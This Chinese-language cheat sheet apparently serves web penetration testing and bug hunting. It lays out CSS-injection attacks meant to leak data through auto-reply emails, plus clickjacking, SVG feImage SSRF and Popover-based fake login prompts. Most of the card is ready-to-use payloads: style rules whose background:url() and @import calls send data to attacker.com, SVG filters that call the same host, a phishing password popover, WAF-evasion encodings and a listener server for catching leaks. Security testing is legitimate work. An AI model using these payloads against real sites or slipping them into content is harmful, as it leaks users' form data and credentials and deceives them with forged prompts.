# CSS 高级攻击 - 快速参考卡片

> **用途**: 快速开始 CSS 注入测试  
> **适用**: 任何 Web 应用的安全测试  
> **最后更新**: 2026-05-21

---

## 🎯 核心思路

**最佳目标**: **邮件系统**（绕过 WAF）

```
表单提交 → 触发自动回复邮件 → 邮件渲染 CSS → background url() 发送请求 → 窃取数据
```

---

## 📋 测试清单（按优先级）

### P0: 邮件系统 CSS 注入 ⭐⭐⭐⭐⭐

**Payload**:
```html
<style>input[name="email"]{background:url('https://attacker.com/leak?field=email')}</style>
```

**步骤**:
1. 在联系表单的 name/email/comment 字段注入 CSS
2. 提交表单，触发自动回复邮件
3. 检查邮件 HTML 源码是否包含 `<style>`
4. 检查攻击者服务器日志是否收到请求

**成功标志**: 服务器收到 `background: url()` 请求 = **中危/高危漏洞**

---

### P1: 子域名点击劫持 ⭐⭐⭐⭐

**检查命令**:
```bash
curl -I https://webint.target.com | grep -i "x-frame-options"
curl -I https://media.target.com | grep -i "x-frame-options"
```

**如果未设置 X-Frame-Options**:
```html
<iframe src="https://subdomain.target.com" style="opacity:0;position:absolute;top:-500px;"></iframe>
<div style="position:fixed;background:green;color:white;">安全连接 ✓</div>
```

**成功标志**: 可以嵌入 iframe = **中危漏洞**

---

### P2: SVG feImage SSRF ⭐⭐⭐⭐

**适用场景**: 文件上传、富文本编辑器

**Payload**:
```html
<svg>
  <filter id="f1">
    <feImage href="http://attacker.com/track"/>
  </filter>
  <rect filter="url(#f1)" width="100" height="100"/>
</svg>
```

**保存为 `.svg` 文件上传**

**成功标志**: 服务器访问 attacker.com = **中危漏洞（SSRF）**

---

### P3: Popover API 欺骗 ⭐⭐⭐

**需要**: HTML 注入点

**Payload**:
```html
<button popovertarget="fake">验证</button>
<div popover id="fake" style="background:white;padding:20px;border:2px solid green;">
  <h2>🔒 安全验证</h2>
  <p>请重新登录以继续</p>
  <input type="password" placeholder="密码">
  <button>确认</button>
</div>
```

**成功标志**: 伪造弹窗渲染 = **中危漏洞**

---

## 🔧 必需工具

### 1. 监听服务器（接收 CSS 请求）

**Python 简单服务器**:
```python
from http.server import HTTPServer, BaseHTTPRequestHandler

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"[+] 收到请求: {self.path}")
        print(f"    Headers: {dict(self.headers)}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

HTTPServer(('0.0.0.0', 8080), Handler).serve_forever()
```

**或使用 Burp Collaborator / interactsh**

### 2. 测试邮箱

- 创建专用测试邮箱（如 Gmail）
- 用于接收目标的自动回复邮件
- 检查邮件 HTML 源码（Gmail: 显示原始邮件）

### 3. 端点发现工具

**Katana 爬虫**:
```bash
katana -u https://target.com -d 3 -jc -ef woff,css -o katana_all.txt
Get-Content katana_all.txt | Select-String "form|contact|submit|api" | Sort-Object -Unique > forms.txt
```

---

## 🎨 Payload 速查表

### CSS 信息窃取
```css
/* 基础 */
input[value]{background:url('https://attacker.com/leak')}

/* 属性选择器 */
input[name="email"][value*="a"]{background:url('https://attacker.com/a')}

/* 内联 style */
<div style="background:url('https://attacker.com/test')">

/* @import */
<style>@import url('https://attacker.com/evil.css')</style>
```

### SVG 攻击
```html
<!-- feImage SSRF -->
<svg><filter><feImage href="http://attacker.com/track"/></filter></svg>

<!-- SMIL 动画重定向 -->
<svg><a><animate attributeName="href" to="http://attacker.com"/></a></svg>
```

### 编码绕过
```html
<!-- HTML 实体 -->
&#x3C;style&#x3E;body{background:url("...")}&#x3C;/style&#x3E;

<!-- 大小写变换 -->
<STYLE>...</STYLE>

<!-- Unicode -->
\u003cstyle\u003e...\u003c/style\u003e
```

### 点击劫持
```html
<iframe src="https://target.com" style="opacity:0"></iframe>
```

### Popover 欺骗
```html
<button popovertarget="test">打开</button>
<div popover id="test">伪造内容</div>
```

---

## 🚀 快速开始

### 方法 1: 使用自动化脚本

```bash
python D:\scan\tools\test_css_advanced_attacks_template.py https://target.com http://your-server.com
```

### 方法 2: 手动测试

**步骤 1**: 启动监听服务器
```bash
python -m http.server 8080
```

**步骤 2**: 找到联系表单
- 访问 `/contact`, `/contact-us`, `/forms/`
- 或使用 Katana 爬取

**步骤 3**: 提交测试 Payload
```
Name: <style>body{background:url('http://YOUR_IP:8080/test')}</style>
Email: test@your-email.com
Message: Testing CSS injection
```

**步骤 4**: 检查监听服务器日志
```
192.168.1.100 - - [21/May/2026 10:30:45] "GET /test HTTP/1.1" 200 -
```

**步骤 5**: 检查收到的邮件 HTML 源码

---

## 📊 漏洞评级参考

| 发现 | 严重程度 | CVSS 估算 |
|------|---------|----------|
| CSS 信息窃取（邮件系统） | 高危 | 6.5-7.5 |
| SVG feImage SSRF | 中危 | 5.0-6.0 |
| 点击劫持（子域名） | 中危 | 4.0-5.0 |
| Popover API 欺骗 | 中危 | 4.0-5.0 |
| CSS !important 覆盖 | 低危 | 3.0-4.0 |

---

## ⚠️ 常见问题

### Q1: 所有请求返回 400？
**A**: 可能是表单字段不匹配，不是 WAF 拦截
- 用浏览器开发者工具查看真实表单字段
- 发送正常请求对比响应

### Q2: 被 Cloudflare Challenge 阻挡？
**A**: requests 库无法绕过 JavaScript Challenge
- 使用 Selenium/Puppeteer
- 或手动测试（浏览器 + Burp Suite）

### Q3: 如何确认 CSS 被执行？
**A**: 检查三个地方：
1. 攻击者服务器日志（收到 `background: url()` 请求）
2. 邮件 HTML 源码（包含注入的 `<style>`）
3. 浏览器控制台（如果有直接渲染）

### Q4: 哪些 CMS 容易测试？
**A**: 
- **Umbraco**: `/umbraco/api/contactform/submit`
- **WordPress**: `/wp-admin/admin-ajax.php`
- **Drupal**: `/webform/rest/submit`
- **自定义**: `/api/contact`, `/api/feedback`

---

## 📚 相关文档

- **详细技术参考**: `D:\scan\common\CSS_ATTACKS_REFERENCE.md`
- **完整测试模板**: `D:\scan\report\安全测试模板.md`
- **HTML/CSS 绕过技术**: `D:\scan\common\html_css_bypass.md`
- **自动化脚本**: `D:\scan\tools\test_css_advanced_attacks_template.py`

---

## 💡 经验教训

1. **不要猜测端点** - 使用 Katana 爬取真实端点
2. **优先测试邮件系统** - 绕过 WAF 的最佳路径
3. **区分 WAF 和表单验证** - 发送正常请求对比
4. **准备多种编码** - HTML 实体、Unicode、大小写变换
5. **SVG 很有价值** - 如果允许上传，成功率很高

---

**最后提醒**: 每次测试后都要记录到 `安全测试模板.md`，积累经验！
